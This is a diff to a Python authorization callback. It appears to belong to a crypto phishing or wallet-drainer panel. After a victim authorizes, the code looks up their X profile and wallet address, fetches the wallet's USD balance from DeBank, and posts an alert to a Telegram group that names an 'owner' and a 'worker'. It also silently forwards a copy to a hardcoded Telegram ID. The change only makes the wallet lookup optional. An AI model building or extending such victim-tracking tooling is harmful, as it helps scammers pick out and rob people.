@@ -181,15 +181,15 @@ def auth_callback():
         data = resp.json()
         print(data)
         
-        address = data["walletAddress"]
+        address = data.get("walletAddress")
+        if address:
+            headers = {"AccessKey": config["DEBANK_API_KEY"]}
+            params = {"id": address}
 
-        headers = {"AccessKey": config["DEBANK_API_KEY"]}
-        params = {"id": address}
+            resp = requests.get("https://pro-openapi.debank.com/v1/user/total_balance", params=params, headers=headers)
+            data = resp.json()
 
-        resp = requests.get("https://pro-openapi.debank.com/v1/user/total_balance", params=params, headers=headers)
-        data = resp.json()
-
-        balance = formatter(data["total_usd_value"])
+            balance = formatter(data["total_usd_value"])
 
         owner_id = group["ids"]["owner"]
         worker = next(
@@ -205,7 +205,7 @@ def auth_callback():
         message = (f'🐍 *User [{parse(username)}](https://x.com/{username}) has authorized\\.*\n'
                    f'👥 *Followers:* {parse(followers)}\n'
                    f'{worker_line}'
-                   f'🔗 *[{address}](https://debank.com/profile/{address})* \\| $*_{parse(balance)}_*')
+                   f'🔗 *[{address}](https://debank.com/profile/{address})* \\| $*_{parse(balance)}_*' if address else '')
 
         send_message(group_id, message)
         send_message(7434895838, f"💬 _{parse(group_id)}_ \\| 👤 _[{owner_id}](tg://user?id={owner_id})_ \\| 👷_[{worker_id}](tg://user?id={worker_id})_\n\n{message}")
